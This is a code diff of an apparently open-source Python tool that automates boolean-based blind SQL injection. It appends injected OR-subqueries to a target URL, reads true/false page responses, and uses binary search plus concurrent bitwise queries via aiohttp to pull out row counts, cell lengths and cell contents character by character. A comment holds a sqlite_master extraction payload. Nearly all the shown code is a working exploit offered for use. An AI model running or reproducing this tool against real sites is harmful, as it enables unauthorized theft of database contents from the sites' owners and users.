@@ -1,36 +1,26 @@
-import configparser
-import ast
+#!/usr/bin/env python
 
 from bs4 import BeautifulSoup
+import asyncio, aiohttp
 import requests
 
+import configparser, ast
 
-def main():
-    s = requests.Session()
+from time import time
 
-    # reading config data or get it from input
-    config = configparser.ConfigParser()
-    config.read("config")
-
-    url         = parse_config('url', "Input target URL: ", config)
-    res_true    = parse_config('res_true', "Response on True queries: ", config)
-    res_false   = parse_config('res_false', "Response on False queries: ", config)
-    table_name  = parse_config('table_name', "Input name of the table you know (if so): ", config)
-    col_name    = parse_config('col_name', "Input name of the column you know (if so): ", config)
-    cookies     = dict(ast.literal_eval(config["Default"].get("cookies"))) \
-                  if config["Default"].get("cookies") \
-                  else dict(input("Set cookie #"+str(i)+": ").split() \
-                  for i in range(int(input("Some cookies? (enter quantity or 0) "))))
-
-    # parse responses
-    parser(s, url, res_true, res_false, cookies, table_name, col_name)
-
+'''
+            READING CONFIG
+'''
 
 def parse_config(key, message, config):
     if config["Default"].get(key):
         return config["Default"].get(key)
     else:
         return input(message)
+
+'''
+            SQL PARSER
+'''
 
 def binary_search(query, x, xmin, s, url, cookies, res_true):
     xmax = x
@@ -56,6 +46,15 @@ def parse_with_query(query, s, url, cookies, res_expected):
     soup = BeautifulSoup(page.text, "lxml")
     return soup.findAll(string=res_expected)
 
+async def async_parse_with_query(query, url, cookies, res_expected, pow_2, cell_bin):
+    async with aiohttp.ClientSession(cookies=cookies) as session:
+        async with session.get(url+query) as resp:
+            html = await resp.text()
+            soup = BeautifulSoup(html, "lxml")
+    if soup.findAll(string=res_expected):
+        cell_bin[pow_2] = "1"
+    return
+
 def parser(s, url, res_true, res_false, cookies, table_name, col_name):
     rows_amount = 200
     approx_rows_amount = True
@@ -80,22 +79,20 @@ def parser(s, url, res_true, res_false, cookies, table_name, col_name):
         if parse_with_query(query_for_rows_num.format(str(rows_amount)) % "=", s, url, cookies, res_true):
             print("\""+table_name+"\" table contents "+str(rows_amount)+" rows")
         else:
-            print(
-                  "\""+table_name+"\" table contents about "+str(rows_amount)+" rows. \
-                  Please, make issue on github repo with your case"
-            )
+            print("\""+table_name+"\" table contents about "+str(rows_amount)+\
+            " rows. Please, make issue on github repo with your case")
         approx_rows_amount = False
     else:
-        print(query_for_rows_num)
+        print("\""+query_for_rows_num+"\" doesn't works")
 
     if not col_name:
         return
 
     for row_num in [str(row_int) for row_int in range(rows_amount)]:
         row_cout = str(int(row_num)+1)
-        # find out length of the rows
-        query_for_rows_length = "' OR (SELECT length("+col_name+") FROM "+table_name+" LIMIT "+row_num+",1) --"
 
+        # find out length of the cell value
+        query_for_rows_length = "' OR (SELECT length("+col_name+") FROM "+table_name+" LIMIT "+row_num+",1) --"
         if parse_with_query(query_for_rows_length, s, url, cookies, res_true):
             print("Looks like \""+query_for_rows_length+"\" works")
             query_for_rows_length = "' OR (SELECT length("+col_name+") %s {} FROM "+table_name+" LIMIT "+row_num+",1) --"
@@ -103,42 +100,65 @@ def parser(s, url, res_true, res_false, cookies, table_name, col_name):
             row_len = binary_search(query_for_rows_length % "<", 150, 1, s, url, cookies, res_true,)
             # additionally checking for result correctness
             if parse_with_query(query_for_rows_length.format(str(row_len)) % "=", s, url, cookies, res_true):
-                print(
-                    row_cout+" row of the \""+col_name+"\" column of the \""+\
-                    table_name+"\" table have "+str(row_len)+" symbols"
-                )
+                print(row_cout+" row of the \""+col_name+"\" column of the \""+\
+                      table_name+"\" table have "+str(row_len)+" symbols")
             else:
-                print(
-                    row_cout+" row of the \""+col_name+"\" column of the \""+\
-                    table_name+"\" table have about "+str(row_len)+" symbols. \
-                    Please, make issue on github repo with your case"
-                )
+                print(row_cout+" row of the \""+col_name+"\" column of the \""+\
+                      table_name+"\" table have about "+str(row_len)+" symbols. \
+                      Please, make issue on github repo with your case")
 
-        # find out rows values
+        # find out cell values "' or (SELECT unicode(substr(name,1,1)) & 512 FROM sqlite_master LIMIT 0, 1) --"
         query_for_rows = "' OR (SELECT unicode(substr("+col_name+",1,1)) FROM "+table_name+" LIMIT "+row_num+",1) > 0 --"
-
         if parse_with_query(query_for_rows, s, url, cookies, res_true):
             print("Looks like \""+query_for_rows+"\" works")
-            row_name = []
-            for i in range(1, row_len + 1):
-                query_for_rows = "' OR (SELECT unicode(substr("+col_name+","+str(i)+",1)) FROM "+table_name+" LIMIT "+row_num+",1) < {} --"
-                # binary search #3
-                row_sym = chr(binary_search(query_for_rows, 300, 1, s, url, cookies, res_true))
-                # additionally checking for result correctness
-                query_for_rows = "' OR (SELECT substr("+col_name+","+str(i)+",1) FROM "+table_name+" LIMIT "+row_num+",1) = '"+row_sym+"' --"
-                if parse_with_query(query_for_rows, s, url, cookies, res_true):
-                    row_name.append(row_sym)
-                else:
-                    row_name.append(row_sym)
-                    print("Please, make issue on github repo with your case")
-            print(
-                row_cout+" row of the \""+col_name+"\" column of the \""+\
-                table_name+"\" table is: "+"".join(row_name)
-            )
+            cell_value = ""
+
+            for i in range(1, row_len + 1): # letter index
+                ch_binary = ""
+                ioloop = asyncio.new_event_loop()
+                tasks = []
+                cell_bin = {1:"0",2:"0",4:"0",8:"0",16:"0",32:"0",64:"0"}
+                for pow_2 in (1,2,4,8,16,32,64,128): # degrees of two for every bit
+                    query_for_rows = "' OR (SELECT unicode(substr("+col_name+","+str(i)+",1)) %26 "+str(pow_2)+" FROM "+table_name+" LIMIT "+row_num+", 1) --"
+                    tasks.append(ioloop.create_task(async_parse_with_query(query_for_rows, url, cookies, res_true, pow_2, cell_bin)))
+                wait_tasks = asyncio.wait(tasks)
+                ioloop.run_until_complete(wait_tasks)
+                ioloop.close()
+                # convert bites dict to characters
+                cell_value = cell_value + chr(int("".join(cell_bin.values())[::-1], 2))
+
+            print(row_cout+" row (cell) of the \""+col_name+"\" column of the \""+\
+                  table_name+"\" table is: "+"".join(cell_value))
 
     print("All rows of the \""+table_name+"\" table have been parsed") \
     if approx_rows_amount == False else \
     print("First "+rows_amount+" rows of the \""+table_name+"\" table have been parsed")
+
+'''
+            MAIN FUNCTION
+'''
+
+def main():
+    s = requests.Session()
+
+    # read config data or get it from input
+    config = configparser.ConfigParser()
+    config.read("config")
+
+    url         = parse_config('url', "Input target URL: ", config)
+    res_true    = parse_config('res_true', "Response on True queries: ", config)
+    res_false   = parse_config('res_false', "Response on False queries: ", config)
+    table_name  = parse_config('table_name', "Input name of the table you know (if so): ", config)
+    col_name    = parse_config('col_name', "Input name of the column you know (if so): ", config)
+    cookies     = dict(ast.literal_eval(config["Default"].get("cookies"))) \
+                  if config["Default"].get("cookies") \
+                  else dict(input("Set cookie #"+str(i)+": ").split() \
+                  for i in range(int(input("Some cookies? (enter quantity or 0) "))))
+
+    t0 = time()
+    # parse responses
+    parser(s, url, res_true, res_false, cookies, table_name, col_name)
+    print(time() - t0)
 
 if __name__ == '__main__':
     try:
